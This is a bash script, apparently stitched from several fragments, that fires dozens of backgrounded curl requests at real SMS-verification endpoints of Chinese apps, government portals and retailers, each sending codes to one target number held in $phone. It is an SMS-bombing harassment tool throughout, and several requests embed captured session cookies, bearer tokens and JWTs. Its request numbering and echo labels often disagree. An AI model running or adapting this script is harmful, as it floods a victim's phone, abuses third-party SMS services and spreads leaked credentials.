    -H "Accept-Encoding: gzip, deflate, br" \
    -H "Accept-Language: zh-CN,zh;q=0.9" \
    -d "{\"mobile\": \"$phone\", \"code\": \"bind\", \"method\": \"user.sms\"}" &
echo "第24个接口运行完毕"

# 第27个请求
curl -X POST "https://smart.shuye.com/api/sms/send" \
    -H "Host: smart.shuye.com" \
    -H "Connection: keep-alive" \
    -H "Content-Length: 40" \
    -H "xweb_xhr: 1" \
    -H "Accept-Language: zh-cn" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9079" \
    -H "token: [object Null]" \
    -H "Content-Type: application/json; charset=UTF-8" \
    -H "Accept: */*" \
    -H "Sec-Fetch-Site: cross-site" \
    -H "Sec-Fetch-Mode: cors" \
    -H "Sec-Fetch-Dest: empty" \
    -H "Referer: https://servicewechat.com/wxd244e1bddbd29494/10/page-frame.html" \
    -H "Accept-Encoding: gzip, deflate, br" \
    -d "{\"mobile\": \"$phone\", \"event\": \"login\"}" &
echo "第25个接口运行完毕"
#!/bin/bash

# 第28个请求
curl -G "https://delivery-api.imdada.cn/v2_0/account/sendVoiceSMSCode/" \
    -H "Host: delivery-api.imdada.cn" \
    -H "Enable-Gps: 0" \
    -H "App-Name: i-dada" \
    -H "Unique-Id: 344EF073-E5E4-42FC-A354-36148D490572" \
    -H "Location-Time: 1714966492526" \
    -H "Platform: iOS" \
    -H "Accept: */*" \
    -H "Locate-Error-Code: -1" \
    -H "Accept-Encoding: gzip;q=1.0, compress;q=0.5" \
    -H "Request-Id: 18929FFB-5AE9-42E1-8646-3D1C29CD43EF" \
    -H "Locate-Altitude: 0" \
    -H "User-Agent: DadaStaff/11.59.1 (com.dada.staff; build:210332; iOS 16.6.1) Alamofire/11.59.1" \
    -H "Locate-Extra: {\"Locate-Provider-Str\":\"unknown\",\"Locate-Time-App\":\"\",\"Locate-Device-Id\":\"344EF073-E5E4-42FC-A354-36148D490572\",\"Locate-Work-Mode\":\"0\",\"Locate-Time-Sdk\":\"0\",\"Locate-Time\":\"1714966492526\",\"Locate-Platform\":\"iOS\",\"Locate-AdCode\":\"0\",\"Locate-ForeGround\":1,\"Locate-Error-Flag\":false}" \
    -H "Operator: unknow" \
    -H "UUID: 344EF073-E5E4-42FC-A354-36148D490572" \
    -H "Work-Mode: 0" \
    -H "Network: wifi" \
    -H "Ad-Code: 0" \
    -H "User-Token: user_token" \
    -H "Locate-Speed: 0" \
    -H "Verification-Hash: bc83fdc4d52ca1e0b0fd4ad00e0fc381" \
    -H "Locate-Type: 2" \
    -H "OS-Version: 16.6.1" \
    -H "City-Code: 0" \
    -H "Model: iPhone12,1" \
    -H "Accept-Language: zh-Hans-CN;q=1.0" \
    -H "Lng: 0" \
    -H "User-Id: 0" \
    -H "Locate-Direction: 0" \
    -H "Rate-Limit-Hash: 81326c6aa3590526572434ef4ef40864" \
    -H "Model-Type: iPhone12,1" \
    -H "Client-Time: 1714966492526" \
    -H "Lat: 0" \
    -H "Locate-From: 1" \
    -H "Connection: keep-alive" \
    -H "Channel-ID: A01" \
    -H "City-Id: 0" \
    -H "App-Version: 11.59.1" \
    -H "Sdcard-Id: 344EF073-E5E4-42FC-A354-36148D490572" \
    -H "Location-Provider: 0" \
    --data-urlencode "phone=$phone" \
    --data-urlencode "type=2" &
echo "第28个接口运行完毕"

# 第29个请求
curl -X POST "https://weixin-nj.pcmh.com.cn/sms-gateway/aliyun/identity-verification?organization-id=11510901345812856P" \
    -H "Host: weixin-nj.pcmh.com.cn" \
    -H "Connection: keep-alive" \
    -H "Content-Length: 24" \
    -H "xweb_xhr: 1" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9079" \
    -H "Content-Type: application/json;charset=UTF-8" \
    -H "Accept: */*" \
    -H "Sec-Fetch-Site: cross-site" \
    -H "Sec-Fetch-Mode: cors" \
    -H "Sec-Fetch-Dest: empty" \
    -H "Referer: https://servicewechat.com/wx43f08083ad884950/20/page-frame.html" \
    -H "Accept-Encoding: gzip, deflate, br" \
    -H "Accept-Language: zh-CN,zh;q=0.9" \
    -d "{\"mobile\": \"$phone\"}" &
echo "第29个接口运行完毕"

# 第30个请求
curl -X POST "https://www.hylyljk.com/ymm-common/sms/sendSmsCode" \
    -H "Host: www.hylyljk.com" \
    -H "Connection: keep-alive" \
    -H "Content-Length: 23" \
    -H "xweb_xhr: 1" \
    -H "userType: 2" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9079" \
    -H "Content-Type: application/json" \
    -H "Accept: */*" \
    -H "Sec-Fetch-Site: cross-site" \
    -H "Sec-Fetch-Mode: cors" \
    -H "Sec-Fetch-Dest: empty" \
    -H "Referer: https://servicewechat.com/wx155e63b80773f98c/7/page-frame.html" \
    -H "Accept-Encoding: gzip, deflate, br" \
    -H "Accept-Language: zh-CN,zh;q=0.9" \
    -d "{\"phone\": \"$phone\"}" &
echo "第30个接口运行完毕"

# 第31个请求
curl -X POST "https://api.zyydjk.net/message/public/sendSms" \
    -H "Host: api.zyydjk.net" \
    -H "Connection: keep-alive" \
    -H "Content-Length: 49" \
    -H "deviceId: 1234567890-1234567890-1234567890" \
    -H "source: yyMiniApp" \
    -H "product: yyMiniApp" \
    -H "authorization: bearer oHY_55PTtR6BhnMQXQFTuI0EMk3A" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9079" \
    -H "Content-Type: application/json" \
    -H "xweb_xhr: 1" \
    -H "openId: 1234567890-1234567890-1234567890" \
    -H "Accept: */*" \
    -H "Sec-Fetch-Site: cross-site" \
    -H "Sec-Fetch-Mode: cors" \
    -H "Sec-Fetch-Dest: empty" \
    -H "Referer: https://servicewechat.com/wxbe9f76c35c45111c/44/page-frame.html" \
    -H "Accept-Encoding: gzip, deflate, br" \
    -H "Accept-Language: zh-CN,zh;q=0.9" \
    -d "{\"phone\": \"$phone\", \"MethodWay\": 1, \"Product\": 1}" &
echo "第31个接口运行完毕"
#!/bin/bash

# 第100个请求
curl -X POST "https://product.yl1001.com/api-yp/register/sendSmsCode" \
    -H "Host: product.yl1001.com" \
    -H "Connection: keep-alive" \
    -H "Content-Length: 24" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9079" \
    -H "id: 0" \
    -H "X-Tingyun: c=B|685-c1OYjko" \
    -H "Content-Type: application/json; charset=UTF-8" \
    -H "Accept: application/json, text/plain, */*" \
    -H "SecretKey: 94cbe78f3bcec8be81d68e7bdfb9ad9b" \
    -H "xweb_xhr: 1" \
    -H "uid: 0" \
    -H "platform: 1" \
    -H "Sec-Fetch-Site: cross-site" \
    -H "Sec-Fetch-Mode: cors" \
    -H "Sec-Fetch-Dest: empty" \
    -H "Referer: https://servicewechat.com/wxcbfa127f857c2790/308/page-frame.html" \
    -H "Accept-Encoding: gzip, deflate, br" \
    -H "Accept-Language: zh-CN,zh;q=0.9" \
    -d "{\"mobile\": \"$phone\"}" &
echo "第32个接口运行完毕"

# 第34个请求
curl -X POST "https://superdesk.avic-s.com/super_cloud/api/wechat/front/smsCode" \
    -H "Host: superdesk.avic-s.com" \
    -H "Connection: keep-alive" \
    -H "Content-Length: 34" \
    -H "Accept: application/json, text/plain, */*" \
    -H "xweb_xhr: 1" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9079" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -H "Sec-Fetch-Site: cross-site" \
    -H "Sec-Fetch-Mode: cors" \
    -H "Sec-Fetch-Dest: empty" \
    -H "Referer: https://servicewechat.com/wx0efbe4601aed7dfe/49/page-frame.html" \
    -H "Accept-Encoding: gzip, deflate, br" \
    -H "Accept-Language: zh-CN,zh;q=0.9" \
    -d "mobile=$phone&orgId=-1&type=0" &
echo "第34个接口运行完毕"

# 第35个请求
curl -X POST "https://wx-prm.bshcn.com.cn/*.jsonRequest" \
    -H "Host: wx-prm.bshcn.com.cn" \
    -H "Connection: keep-alive" \
    -H "Content-Length: 46" \
    -H "B-Product-Code: hcn.sh-pdxqrmyy.patient_mini" \
    -H "B-Version: 1.2.2.8" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9079" \
    -H "Content-Type: application/json" \
    -H "T-Product-Code: hcn.sh-pdxqrmyy.patient_mini" \
    -H "X-Service-Method: registerSmsCodeNew" \
    -H "xweb_xhr: 1" \
    -H "X-Access-Token: " \
    -H "X-Service-Id: cas.wxregisterService" \
    -H "Accept: */*" \
    -H "Sec-Fetch-Site: cross-site" \
    -H "Sec-Fetch-Mode: cors" \
    -H "Sec-Fetch-Dest: empty" \
    -H "Referer: https://servicewechat.com/wxca096f515338c55b/159/page-frame.html" \
    -H "Accept-Encoding: gzip, deflate, br" \
    -H "Accept-Language: zh-CN,zh;q=0.9" \
    -d "[\"hcn.sh-pdxqrmyy.patient_mini\",\"$phone\"]" &
echo "第35个接口运行完毕"

# 第36个请求
curl -X POST "https://user.zjzwfw.gov.cn/nuc/reg/sendSmsCode" \
    -H "Host: user.zjzwfw.gov.cn" \
    -H "Connection: keep-alive" \
    -H "Content-Length: 23" \
    -H "guc-accountType: person" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9079" \
    -H "Content-Type: application/json;charset=UTF-8" \
    -H "ak: ak" \
    -H "guc-platform: weixin" \
    -H "xweb_xhr: 1" \
    -H "guc-endpoint: C" \
    -H "X-Site-Code: 339900" \
    -H "X-Device-Id: 37a4be4390593c68963e5ab24bc7e209" \
    -H "Accept: */*" \
    -H "Sec-Fetch-Site: cross-site" \
    -H "Sec-Fetch-Mode: cors" \
    -H "Sec-Fetch-Dest: empty" \
    -H "Referer: https://servicewechat.com/wx289ade03af020941/39/page-frame.html" \
    -H "Accept-Encoding: gzip, deflate, br" \
    -H "Accept-Language: zh-CN,zh;q=0.9" \
    -d "{\"phone\": \"$phone\"}" &
echo "第36个接口运行完毕"

# 第37个请求
curl -X POST "https://96885wx.hrss.jl.gov.cn/minifast/frontRestService/frontBcpDataRestService/getBcpData" \
    -H "Host: 96885wx.hrss.jl.gov.cn" \
    -H "Connection: keep-alive" \
    -H "Content-Length: 95" \
    -H "xweb_xhr: 1" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9079" \
    -H "Content-Type: application/json" \
    -H "Accept: */*" \
    -H "Sec-Fetch-Site: cross-site" \
    -H "Sec-Fetch-Mode: cors" \
    -H "Sec-Fetch-Dest: empty" \
    -H "Referer: https://servicewechat.com/wx93486ef87cedbd44/139/page-frame.html" \
    -H "Accept-Encoding: gzip, deflate, br" \
    -H "Accept-Language: zh-CN,zh;q=0.9" \
    -d "{\"methodName\":\"JRZX_093\",\"loginNo\":\"$phone\",\"loginType\":\"10\",\"yae100\":\"12\",\"siteToken\":\"\"}" &
echo "第37个接口运行完毕"
#!/bin/bash

# 第38个请求
curl -X POST "https://m.52xiaoyuan.cn/mapp/getMappSmsCode" \
    -H "Host: m.52xiaoyuan.cn" \
    -H "Connection: keep-alive" \
    -H "Content-Length: 45" \
    -H "dhash: eda4e699e178c69039367ce5f7b871dd" \
    -H "ts: 1711226083884510;ede6895b37b5d7f5e18f74cc6334c855" \
    -H "xweb_xhr: 1" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9079" \
    -H "token: bafcee32-6075-4a58-bbe4-a17bc253939a" \
    -H "Content-Type: application/json" \
    -H "Accept: */*" \
    -H "Sec-Fetch-Site: cross-site" \
    -H "Sec-Fetch-Mode: cors" \
    -H "Sec-Fetch-Dest: empty" \
    -H "Referer: https://servicewechat.com/wx56c43729cf6a360a/25/page-frame.html" \
    -H "Accept-Encoding: gzip, deflate, br" \
    -H "Accept-Language: zh-CN,zh;q=0.9" \
    -d "{\"mobile\": \"$phone\", \"module\": \"xykt_gctc\"}" &
echo "第38个接口运行完毕"

# 第39个请求
curl -X POST "https://sqsz.shiyan.gov.cn/smartCommunity/appsend/sendCode?time=1711225888672&sign=516256e7e7ae11f7ac9a51eb6c4e0da4" \
    -H "Host: sqsz.shiyan.gov.cn" \
    -H "Connection: keep-alive" \
    -H "Content-Length: 95" \
    -H "clientinfo: {\"devid\":\"\"}" \
    -H "xweb_xhr: 1" \
    -H "headdata: %7B%22data_value%22%3A%2217343387439%22%2C%22flag%22%3A0%2C%22send_type%22%3A1%2C%22communityId%22%3A6%2C%22roleId%22%3A2%2C%22user_id%22%3A246756%7D" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9079" \
    -H "Content-Type: application/json" \
    -H "Accept: */*" \
    -H "Sec-Fetch-Site: cross-site" \
    -H "Sec-Fetch-Mode: cors" \
    -H "Sec-Fetch-Dest: empty" \
    -H "Referer: https://servicewechat.com/wx75e106ac21a7eea8/46/page-frame.html" \
    -H "Accept-Encoding: gzip, deflate, br" \
    -H "Accept-Language: zh-CN,zh;q=0.9" \
    -d "{\"data_value\": \"$phone\", \"flag\": 0, \"send_type\": 1, \"communityId\": 6, \"roleId\": 2, \"user_id\": 246756}" &
echo "第39个接口运行完毕"

# 第40个请求
curl -X POST "https://ehr-recruitment.yifengx.com/restful/login/sendMessage" \
    -H "Host: ehr-recruitment.yifengx.com" \
    -H "Connection: keep-alive" \
    -H "Content-Length: 23" \
    -H "xweb_xhr: 1" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9079" \
    -H "Content-Type: application/json" \
    -H "Accept: */*" \
    -H "Sec-Fetch-Site: cross-site" \
    -H "Sec-Fetch-Mode: cors" \
    -H "Sec-Fetch-Dest: empty" \
    -H "Referer: https://servicewechat.com/wx1768e077cefc65b1/79/page-frame.html" \
    -H "Accept-Encoding: gzip, deflate, br" \
    -H "Accept-Language: zh-CN,zh;q=0.9" \
    -d "{\"phone\": \"$phone\"}" &
echo "第40个接口运行完毕"

# 第41个请求
curl -X POST "https://yf.yifengyunche.com/admin/yfycapp/get_sms/secret/f68a6f6e071090621458faeed3cbc781" \
    -H "Host: yf.yifengyunche.com" \
    -H "Connection: keep-alive" \
    -H "Content-Length: 70" \
    -H "xweb_xhr: 1" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9079" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -H "Accept: */*" \
    -H "Sec-Fetch-Site: cross-site" \
    -H "Sec-Fetch-Mode: cors" \
    -H "Sec-Fetch-Dest: empty" \
    -H "Referer: https://servicewechat.com/wx21fd3633e52da572/66/page-frame.html" \
    -H "Accept-Encoding: gzip, deflate, br" \
    -H "Accept-Language: zh-CN,zh;q=0.9" \
    --data-urlencode "phone=$phone" \
    --data-urlencode "sms_type=xcx_login" \
    --data-urlencode "uuid=oguyl5B1fCGz-AgAXyi1DEhCykPE" &
echo "第41个接口运行完毕"

#!/bin/bash

# 第42个请求
curl -X POST "https://account.xiaomi.com/pass/sns/wxapp/v2/sendTicket" \
    -H "Host: account.xiaomi.com" \
    -H "Connection: keep-alive" \
    -H "Content-Length: 34" \
    -H "xweb_xhr: 1" \
    -H "cookie: wxSToken=p+qwiucQZ0j+B76YG0aqz4//m7yT7J6112faWuPTzmhW4wCDtLfGVVYgmru1gP80G+DWjqJOeiJ+abPOim657IxKwTHbe5x3SN5hgpOKR9soC2Kz442TXXKTFFDGnGjU21K1T36ZUayxzPYBGPtlgX5Nq8zIGowlQu9SbrIexoVXE9UfRVbora6qZC7rIARj;" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9079" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -H "Accept: */*" \
    -H "Sec-Fetch-Site: cross-site" \
    -H "Sec-Fetch-Mode: cors" \
    -H "Sec-Fetch-Dest: empty" \
    -H "Referer: https://servicewechat.com/wx183d85f5e5e273c6/15/page-frame.html" \
    -H "Accept-Encoding: gzip, deflate, br" \
    -H "Accept-Language: zh-CN,zh;q=0.9" \
    --data-urlencode "phone=$phone" \
    --data-urlencode "sid=micar_wxlite" &
echo "第42个接口运行完毕"

# 第43个请求
curl -X POST "https://api.kq36.com/public/returnhtm/return_uni-app.asp?cmd=login_user_phone" \
    -H "Host: api.kq36.com" \
    -H "Connection: keep-alive" \
    -H "Content-Length: 63" \
    -H "ua: {\"v\":3,\"n\":\"mp-weixin\"}" \
    -H "xweb_xhr: 1" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9079" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -H "Accept: */*" \
    -H "Sec-Fetch-Site: cross-site" \
    -H "Sec-Fetch-Mode: cors" \
    -H "Sec-Fetch-Dest: empty" \
    -H "Referer: https://servicewechat.com/wx01c584b2a7cd0c15/264/page-frame.html" \
    -H "Accept-Encoding: gzip, deflate, br" \
    -H "Accept-Language: zh-CN,zh;q=0.9" \
    --data-urlencode "mobile=$phone" \
    --data-urlencode "typen=login" \
    --data-urlencode "uid=oZqPrs4_EwbdKo5yZsiQhzPr29iA" &
echo "第43个接口运行完毕"

# 第44个请求
curl -X POST "https://newretail2.xianfengsg.com/newretail/api/sms/sendSms" \
    -H "Host: newretail2.xianfengsg.com" \
    -H "Connection: keep-alive" \
    -H "Content-Length: 24" \
    -H "self-store-id: 1648354775180" \
    -H "wxa-appid: wxb34bc4be8e276ed8" \
    -H "os-version: wxapp-3.9.6" \
    -H "access-token: eyJhbGciOiJIUzI1NiJ9.eyJqdGkiOiI1MjM2QSIsInN1YiI6IntcInVzZXJJZFwiOjE3NzI5NTE0MzE1MTM0Mjc5NjksXCJ1c2VyVHlwZVwiOlwiV1hBX1VTRVJcIixcIndvcmtpbmdPcmdJZFwiOjEwMTExLFwid3hhT3BlbmlkXCI6XCJvM1QwYzVQeVFOeHl2VXNwMC0ta3JEVFlkc0VjXCJ9IiwiaWF0IjoxNzExNTM5NTM1LCJleHAiOjE3MTE2MjU5MzV9.Y37exds3aIdi_vq2FbsBmKvpv-sg-NCTSLM886-lgSg" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9079" \
    -H "delivery-store-id: 1648354775180" \
    -H "Content-Type: application/json" \
    -H "xweb_xhr: 1" \
    -H "api-version: 0.0.5" \
    -H "app-version: wxapp-3.1.45" \
    -H "Accept: */*" \
    -H "Sec-Fetch-Site: cross-site" \
    -H "Sec-Fetch-Mode: cors" \
    -H "Sec-Fetch-Dest: empty" \
    -H "Referer: https://servicewechat.com/wxb34bc4be8e276ed8/719/page-frame.html" \
    -H "Accept-Encoding: gzip, deflate, br" \
    -H "Accept-Language: zh-CN,zh;q=0.9" \
    -d "{\"mobile\": \"$phone\"}" &
echo "第44个接口运行完毕"
#!/bin/bash

# 第45个请求
curl -X POST "https://www.zara.cn/itxrest/1/user/store/11716/verify/send-code?languageId=-7" \
    -H "Host: www.zara.cn" \
    -H "Connection: keep-alive" \
    -H "Content-Length: 64" \
    -H "WCTrustedToken: 100240366335%2CwMeokmx34GF0tDE4ONTr9PHYTnUMx3eC31M9idfwvIA%3D" \
    -H "ITX-APPID: ZaraWechat wxd95a72c5f595b6a3" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9079" \
    -H "WCToken: 100240366335%2CtBMwYGFsn%2BlVqrxv2qna1XpghCNKlMz1lChtTq7W4RFw6%2BU7WHIDBTLhLDo9OMPzb6rpW0EDJ9dU3ZugwHrUzp82IkXOjzA1lTGNVBkX7DR2q7lYVjXaQA1u6NHX%2BKhrhp%2FxCi6GIF651l4L5VkL1CRekO6WfZ2aJUOvi0rA57ZiFyurTvAi%2Bh4TL3UQTdLCLQIbJ46bLsmbQFzpB5qnVvjuPGbV1q6wLjBnLdkSkUgmO1czuQumbu%2BM%2BAQ2i4VR" \
    -H "Content-Type: application/json" \
    -H "xweb_xhr: 1" \
    -H "userId: 100240366335" \
    -H "Cookie: ITXSESSIONID=430432c696c6131368ccd9620151d413; ITXDEVICEID=a9284b4ce3afc90a016fa711c48288a1; IDROSTA=0b77996b5a86:32a914adaff7c6c9fb2b8233d; _abck=1B3AE95117673B9C8CB1ACC89C340C70~-1~YAAQFAWK3qB6eTaOAQAA+DokfwuEW2bTVIIFrymGc6tbIFh8WRyufdH0e0Peo2qrO7VagICwx8wMHFTAG+8bkJy+krieYYFBNcw1hpenGxFnXV6Y/q5utsBzLVy3JuYr7JN0vWdKyFSow69/GYN9i+QGBV7Hvmyf+0+rgIlGsCTWJCReZpziznutoQN33xORc6CaYA3UZc/4xixP6OBTcfR6tsU5C0no8BdbPEo8If1MVgE3sgguJjfSCAWm9yc5sVl5QvZTplp6zF9Cu54QTYYlR0Zs2ywwjEK/ZSScDixvK9U2gmBVGF2snddrsxi9olr0uVMy+yYoZupZha/7ySeRVKfz/kXO6UlDnBNFDciZzmw2gg;JSESSIONID=0000Me_t-Egf2Zj4W3DqjLBVw7-:3aa4aakdv; ITXSESSIONID=430432c696c6131368ccd9620151d413;__mgjuuid=736d90cf-59d4-4016-a462-9323b90d6a1e; bm_sz=3EF6893EDCB93926B93E43151002DC11~YAAQDgWK3uj02zWOAQAAoFgjfxeSyS12EW/VkWXPf0kh8k7ADct2iIktIYfj6AYdZzYLN7+JPb1gHG15nk7txm/A+m8nYOgChvTi0wlHwe78sb/GdcnXOnyIUG2OjaUboiMB0gIfpbvUsqiP3nYTm4dYO3sC+tE5TAlluXsx7QRtNv/QzMUYZc35qXQ2pfoeVS+fNDdEcwzmrJzCBgk5vkhULnR2EAt1oWWDvEZtN9gidAFrUqA+pAzM3lUNCgrhIChz3e+TdKJ6lt5x+pXwPH+FTWDdZd0V6Fwmi1LVs6q+ckzeZGfXcQNsIAPmOwe9DCXPEh+ooH9CwXNxk58JH8u03WaQYffQIyyGH7QodhTl74" \
    -H "Accept: */*" \
    -H "Sec-Fetch-Site: cross-site" \
    -H "Sec-Fetch-Mode: cors" \
    -H "Sec-Fetch-Dest: empty" \
    -H "Referer: https://servicewechat.com/wxd95a72c5f595b6a3/334/page-frame.html" \
    -H "Accept-Encoding: gzip, deflate, br" \
    -H "Accept-Language: zh-CN,zh;q=0.9" \
    --data-raw "{\"phone\":{\"countryCode\":\"+86\",\"subscriberNumber\":\"$phone\"}}" &
echo "第45个接口运行完毕"

# 第46个请求
curl -X POST "https://xiaoshou.lujiandairy.com/api/wx/send/mobile/bind_mobile" \
    -H "Host: xiaoshou.lujiandairy.com" \
    -H "Connection: keep-alive" \
    -H "Content-Length: 24" \
    -H "xweb_xhr: 1" \
    -H "role: " \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9079" \
    -H "token: " \
    -H "Content-Type: application/json" \
    -H "Accept: */*" \
    -H "Sec-Fetch-Site: cross-site" \
    -H "Sec-Fetch-Mode: cors" \
    -H "Sec-Fetch-Dest: empty" \
    -H "Referer: https://servicewechat.com/wx881f659964749509/15/page-frame.html" \
    -H "Accept-Encoding: gzip, deflate, br" \
    -H "Accept-Language: zh-CN,zh;q=0.9" \
    --data-raw "{\"mobile\": \"$phone\"}" &
echo "第46个接口运行完毕"

curl -X POST "https://api.kucee.com/website.Access/getPhoneCode" \
    -H "Host: api.kucee.com" \
    -H "Connection: keep-alive" \
    -H "Content-Length: 136" \
    -H "W-Token: 4276" \
    -H "xweb_xhr: 1" \
    -H "U-Token: " \
    -H "AppId-Token: wx942a1bf556cf82ed" \
    -H "Uni-Code: 633f39b271e585b3ed3af77237320e21" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9079" \
    -H "Content-Type: application/json" \
    -H "Accept: */*" \
    -H "Sec-Fetch-Site: cross-site" \
    -H "Sec-Fetch-Mode: cors" \
    -H "Sec-Fetch-Dest: empty" \
    -H "Referer: https://servicewechat.com/wx942a1bf556cf82ed/1/page-frame.html" \
    -H "Accept-Encoding: gzip, deflate, br" \
    -H "Accept-Language: zh-CN,zh;q=0.9" \
    --data-raw "{\"phone\": \"$phone\", \"type\": 1, \"lat\": 12435, \"lng\": 8946, \"storeId\": 0, \"appId\": \"wx942a1bf556jsnsb\", \"scene\": 1053}" &
echo "第46个接口运行完毕"
curl -X POST "https://api.jmfww.com/api/Common/GetMobileCode" \
    -H "Host: api.jmfww.com" \
    -H "Connection: keep-alive" \
    -H "Content-Length: 25" \
    -H "xweb_xhr: 1" \
    -H "Authorization: Bearer" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9079" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -H "Accept: */*" \
    -H "Sec-Fetch-Site: cross-site" \
    -H "Sec-Fetch-Mode: cors" \
    -H "Sec-Fetch-Dest: empty" \
    -H "Referer: https://servicewechat.com/wxe1329bb7bf594139/9/page-frame.html" \
    -H "Accept-Encoding: gzip, deflate, br" \
    -H "Accept-Language: zh-CN,zh;q=0.9" \
    --data-urlencode "mobile=$phone" \
    --data-urlencode "type=2" &
